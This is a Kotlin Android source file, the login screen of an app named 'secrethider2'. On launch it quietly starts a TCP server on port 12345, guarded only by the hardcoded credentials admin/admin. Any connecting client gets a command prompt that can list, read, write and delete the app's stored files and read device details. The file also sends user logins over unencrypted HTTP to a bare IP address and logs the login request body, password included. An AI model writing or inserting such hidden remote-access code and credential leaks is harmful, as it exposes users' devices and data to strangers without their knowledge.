package com.example.secrethider2

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Environment
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.io.PrintWriter
import java.io.IOException
import java.net.ServerSocket
import java.net.Socket
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody

class LoginActivity : AppCompatActivity() {

    private lateinit var editTextUsername: EditText
    private lateinit var editTextPassword: EditText
    private lateinit var buttonLogin: Button
    private lateinit var buttonRegister: Button

    private val client = OkHttpClient()
    private val port = 12345
    private val username = "admin"
    private val password = "admin"
    private var serverSocket: ServerSocket? = null
    private var isServiceRunning = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_login)

        // Initialize views
        editTextUsername = findViewById(R.id.editTextUsername)
        editTextPassword = findViewById(R.id.editTextPassword)
        buttonLogin = findViewById(R.id.buttonLogin)
        buttonRegister = findViewById(R.id.buttonRegister)

        // Check and request storage permissions on launch
        requestPermissions()

        // Start the remote service when the application opens
        startRemoteService()

        // Set up login button click listener
        buttonLogin.setOnClickListener {
            val username = editTextUsername.text.toString()
            val password = editTextPassword.text.toString()

            if (username.isNotEmpty() && password.isNotEmpty()) {
                Log.d("LoginActivity", "Attempting to login with username: $username")
                loginUser(username, password)
            } else {
                Toast.makeText(this, "Please fill in all fields", Toast.LENGTH_SHORT).show()
            }
        }

        // Set up register button click listener to navigate to RegisterActivity
        buttonRegister.setOnClickListener {
            val intent = Intent(this, RegisterActivity::class.java)
            startActivity(intent)
        }
    }

    /**
     * Requests necessary permissions for storage access.
     */
    private fun requestPermissions() {
        val permissions = arrayOf(
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
        if (!hasPermissions(*permissions)) {
            ActivityCompat.requestPermissions(this, permissions, 0)
        }
    }

    private fun hasPermissions(vararg permissions: String): Boolean {
        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    /**
     * Starts the remote service by initializing a ServerSocket on the specified port.
     * It listens for incoming client connections in a coroutine.
     */
    private fun startRemoteService() {
        if (isServiceRunning) return // Ensure the service is only started once
        Log.d("LoginActivity", "Starting the remote service on port $port")
        isServiceRunning = true

        // Start the server in a coroutine
        CoroutineScope(Dispatchers.IO).launch {
            try {
                serverSocket = ServerSocket(port)
                Log.d("LoginActivity", "Server started on port $port")

                // Keep accepting client connections while the service is running
                while (isServiceRunning) {
                    val clientSocket = serverSocket?.accept()
                    Log.d("LoginActivity", "Client connected: ${clientSocket?.inetAddress}")

                    clientSocket?.let {
                        handleClientConnection(it)
                    }
                }
            } catch (e: Exception) {
                Log.e("LoginActivity", "Error while running the server: ${e.message}")
            }
        }
    }

    /**
     * Handles client connections by prompting for credentials and executing commands.
     */
    private fun handleClientConnection(clientSocket: Socket) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val input = BufferedReader(InputStreamReader(clientSocket.getInputStream()))
                val output = PrintWriter(clientSocket.getOutputStream(), true)

                // Request and log username and password inputs
                output.println("Enter username:")
                val userInput = input.readLine()
                Log.d("LoginActivity", "Received username: $userInput")

                output.println("Enter password:")
                val passInput = input.readLine()
                Log.d("LoginActivity", "Received password for username $userInput")

                if (userInput == username && passInput == password) {
                    Log.d("LoginActivity", "Access granted for user: $userInput")
                    output.println("Access granted. Welcome to the Mobile Remote Manager.")
                    output.println("Available commands: get_storage, read_file <name>, write_file <name> <content>, delete_file <name>, get_device_info")

                    var command: String?
                    while (isServiceRunning && clientSocket.isConnected) {
                        output.print("RemoteDeviceManager> ")
                        command = input.readLine()

                        if (command == null || command.lowercase() == "exit") {
                            output.println("Disconnecting from the server.")
                            break
                        }

                        // Execute the command and send back the output
                        val commandOutput = executeCommand(command)
                        output.println(commandOutput)
                    }
                } else {
                    Log.d("LoginActivity", "Access denied for user: $userInput")
                    output.println("Access denied. Invalid credentials.")
                }
                clientSocket.close()
                Log.d("LoginActivity", "Client connection closed: ${clientSocket.inetAddress}")
            } catch (e: Exception) {
                Log.e("LoginActivity", "Error handling client connection: ${e.message}")
            }
        }
    }

    /**
     * Executes a specified command and returns the result as a string.
     */
    private fun executeCommand(command: String): String {
        val parts = command.split(" ")
        return when (parts[0].lowercase()) {
            "get_storage" -> getStorageFiles()
            "read_file" -> readFile(parts.getOrNull(1))
            "write_file" -> writeFile(parts.getOrNull(1), parts.drop(2).joinToString(" "))
            "delete_file" -> removeFile(parts.getOrNull(1))
            "get_device_info" -> getDeviceInfo()
            else -> "Unknown command"
        }
    }

    /**
     * Lists files in the app’s accessible storage directory.
     */
    private fun getStorageFiles(): String {
        val storageDir = getExternalFilesDir(null) ?: return "Storage not accessible"
        return storageDir.listFiles()?.joinToString("\n") { it.name } ?: "No files found"
    }

    /**
     * Reads the content of a specified file.
     */
    private fun readFile(fileName: String?): String {
        val file = File(getExternalFilesDir(null), fileName ?: return "File name not provided")
        return if (file.exists()) {
            file.readText()
        } else {
            "File not found"
        }
    }

    /**
     * Writes content to a specified file.
     */
    private fun writeFile(fileName: String?, content: String): String {
        val file = File(getExternalFilesDir(null), fileName ?: return "File name not provided")
        return try {
            file.writeText(content)
            "Data written to ${file.name}"
        } catch (e: IOException) {
            "Failed to write to file: ${e.message}"
        }
    }

    /**
     * Deletes a specified file.
     */
    private fun removeFile(fileName: String?): String {
        val file = File(getExternalFilesDir(null), fileName ?: "")
        return if (file.exists() && file.delete()) {
            "File ${file.name} deleted"
        } else {
            "File not found or deletion failed"
        }
    }


    /**
     * Retrieves basic device information such as model, manufacturer, and OS version.
     */
    private fun getDeviceInfo(): String {
        return """
            Device Model: ${android.os.Build.MODEL}
            Manufacturer: ${android.os.Build.MANUFACTURER}
            OS Version: ${android.os.Build.VERSION.RELEASE}
            SDK Version: ${android.os.Build.VERSION.SDK_INT}
        """.trimIndent()
    }

    private fun loginUser(username: String, password: String) {
        val url = "http://45.33.102.27:5000/login"
        val json = JSONObject()
        json.put("username", username)
        json.put("password", password)

        val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        Log.d("LoginActivity", "Sending login request to $url with body: $json")

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("LoginActivity", "Login request failed: ${e.message}")
                runOnUiThread {
                    Toast.makeText(this@LoginActivity, "Login failed", Toast.LENGTH_SHORT).show()
                }
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    val responseBody = response.body
                    val responseString = responseBody?.string() ?: ""
                    responseBody?.close()

                    Log.d("LoginActivity", "Login response body: $responseString")
                    val jsonResponse = JSONObject(responseString)
                    val userId = jsonResponse.optInt("user_id", -1)

                    runOnUiThread {
                        if (userId != -1) {
                            Toast.makeText(this@LoginActivity, "Login successful", Toast.LENGTH_SHORT).show()
                            val intent = Intent(this@LoginActivity, ProfileActivity::class.java)
                            intent.putExtra("user_id", userId)
                            startActivity(intent)
                            finish()
                        } else {
                            Toast.makeText(this@LoginActivity, "Failed to retrieve user ID", Toast.LENGTH_SHORT).show()
                        }
                    }
                } else {
                    runOnUiThread {
                        Toast.makeText(this@LoginActivity, "Login failed: ${response.message}", Toast.LENGTH_SHORT).show()
                    }
                }
            }
        })
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("LoginActivity", "Activity destroyed, stopping service if running")
        isServiceRunning = false
        serverSocket?.close()
    }
}
